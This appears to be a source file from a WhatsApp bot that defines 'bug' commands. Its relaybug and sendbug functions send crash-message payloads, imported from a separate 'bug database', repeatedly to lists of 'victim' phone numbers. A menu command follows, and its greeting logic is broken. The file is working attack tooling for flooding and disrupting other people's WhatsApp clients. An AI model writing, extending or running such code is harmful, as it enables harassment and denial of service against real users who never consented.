const { zokou } = require("../framework/zokou");
const { delay, loading, react } = require("../framework/utils");
const moment = require("moment-timezone");
const conf = require("../set.js");
const fs = require("fs");
const path = require("path");
const {
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");

// bug database
const { bugtext1 } = require("../framework/bug/bugtext1");
const { bugtext2 } = require("../framework/bugs/bugtext2");
const { bugtext3 } = require("../framework/bug/bugtext3");
const { bugtext4 } = require("../framework/bug/bugtext4");
const { bugtext5 } = require("../framework/bug/bugtext5");
const { bugtext6 } = require("../framework/bug/bugtext6");
const { bugpdf } = require("../framework/bug/bugpdf.js");

const category = "Bug-cmds";
const reaction = "🤯";

const mess = {};
mess.prem = "You are not authorised to use this  command !!!";

const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
const whatsappRegex =
    /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;

const timewisher = time => {
    if (time < "23:59:00") {
        return `Good Night 🌆`;
    } else if (time < "19:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "18:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "15:00:00") {
        return `Good Afternoon 🌅`;
    } else if (time < "11:00:00") {
        return `Good Morning 🌄`;
    } else if (time < "05:00:00") {
        return `Good Morning 🌄`;
    }
};

async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                var scheduledCallCreationMessage = generateWAMessageFromContent(
                    dest,
                    proto.Message.fromObject(bug),
                    { userJid: dest, quoted: ms }
                );
                try {
                    zk.relayMessage(
                        victim,
                        scheduledCallCreationMessage.message,
                        { messageId: scheduledCallCreationMessage.key.id }
                    );
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                try {
                    zk.sendMessage(victim, bug);
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}


// --cmds--

// bug menu
zokou(
    {
        nomCom: "🐛",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre } = commandOptions;
        const mono = "```";
        const time = moment().tz(conf.TZ).format("HH:mm:ss");
        const versions = ["v1", "v2"];
        const version = versions[Math.floor(Math.random() * versions.length)];
        const menuImage = fs.readFileSync(
            path.resolve(
                path.join(__dirname, "..", "media", "deleted-message.jpg")
            )
        );
        const tumbUrl =
            "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
        let menu = `${mono}Hello ${ms.pushName}
${timewisher(time)}



┗❏${mono}`;
        switch (version) {
            case "v1":
                {
                    zk.sendMessage(
                        dest,
                        {
                            image: menuImage,
                            caption: menu
                        },
                        { quoted: ms }
                    );
                }
                break;
            case "v2":
                {
                    zk.sendMessage(
                        dest,
                        {
                            image: menuImage,
                            caption: menu,
                            contextInfo: {
                                mentionedJid: [ms.key.remoteJid],
                                forwardingScore: 9999999,
                                isForwarded: true,
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${conf.BOT}`,
                                    body: `Bot Created By ${conf.OWNER_NAME}`,
                                    thumbnail: { url: tumbUrl },
                                    thumbnailUrl: tumbUrl,
                                    previewType: "PHOTO",
                                    sourceUrl:
                                        "https://whatsapp.com/channel/0029VaeRrcnADTOKzivM0S1r",
                                    mediaType: 1,
                                    renderLargerAbhinail: true
                                }
                            }
                        },
                        { quoted: ms }
                    );
                }
                break;
        }
    }
)
